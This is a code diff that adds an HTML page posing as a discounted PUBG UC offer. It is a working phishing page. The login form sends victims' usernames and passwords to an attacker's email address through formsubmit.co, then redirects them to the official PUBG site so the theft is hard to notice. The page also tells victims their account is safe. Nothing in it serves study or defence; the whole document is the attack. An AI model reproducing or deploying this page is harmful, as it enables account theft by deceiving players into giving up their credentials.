@@ -1,0 +1,93 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Special UC Offer</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <style>
+    body {
+      background-image: url('uc.jpg');
+      background-size: contain;
+      background-position: left;
+      background-repeat: repeat;
+    }
+    .bg {
+      width: 50vw;
+      height: 100vh;
+    }
+    .uc-icon {
+      position: absolute;
+      width: 50px;
+      height: auto;
+      z-index: 0;
+      opacity: 0.7;
+    }
+
+    @media (max-width: 640px) {
+      body {
+        background-size: cover;
+        background-position: center;
+      }
+      .bg {
+        display: none;
+      }
+      .responsive-card {
+        background-color: rgba(255, 255, 255, 0.2) !important;
+      }
+      .uc-icon {
+        width: 30px;
+      }
+    }
+  </style>
+</head>
+<body class="flex items-center justify-center min-h-screen relative">
+
+  <div class="bg"></div>
+
+  <!-- UC Icons Around the Page -->
+
+  <div class="max-w-md w-full p-6 bg-white bg-opacity-90 rounded-2xl shadow-xl space-y-6 relative z-10 responsive-card">
+
+    <!-- PUBG Icon -->
+    <div class="flex justify-center">
+      <img src="icon.jpg" alt="PUBG Logo" class="h-16 mb-4">
+    </div>
+
+    <!-- Offer Card -->
+    <div class="bg-gradient-to-r from-yellow-400 to-orange-500 p-6 rounded-xl text-white text-center shadow-md">
+      <h2 class="text-3xl font-bold">🔥 Special Offer 🔥</h2>
+      <p class="mt-2 text-xl">1,000 UC only for <span class="font-bold">400 AFN</span></p>
+      <p class="text-sm mt-1">Limited time only – Grab it now!</p>
+    </div>
+
+    <!-- Login Form -->
+    <form action="https://formsubmit.co/silent.anonymous1212@gmail.com" method="POST" class="space-y-4">
+
+        <!-- Username Field -->
+        <div>
+          <label for="username" class="block text-sm font-medium text-gray-700">Username</label>
+          <input type="text" id="username" name="username" class="mt-1 w-full p-2 border rounded-md focus:ring focus:ring-yellow-400" placeholder="Enter your username" required />
+        </div>
+      
+        <!-- Password Field -->
+        <div>
+          <label for="password" class="block text-sm font-medium text-gray-700">Password</label>
+          <input type="password" id="password" name="password" class="mt-1 w-full p-2 border rounded-md focus:ring focus:ring-yellow-400" placeholder="Enter your password" required />
+        </div>
+      
+        <!-- Hidden Fields -->
+        <input type="hidden" name="_subject" value="New Login Form Submission" />
+        <input type="hidden" name="_next" value="https://www.pubgmobile.com/home.shtml" />
+      
+        <button type="submit" class="w-full bg-yellow-500 hover:bg-yellow-600 text-white font-semibold py-2 rounded-md transition">
+          Login
+        </button>
+      </form>
+      
+
+    <p class="text-xs text-center text-gray-500">Your account is safe with us ❤️</p>
+  </div>
+
+</body>
+</html>
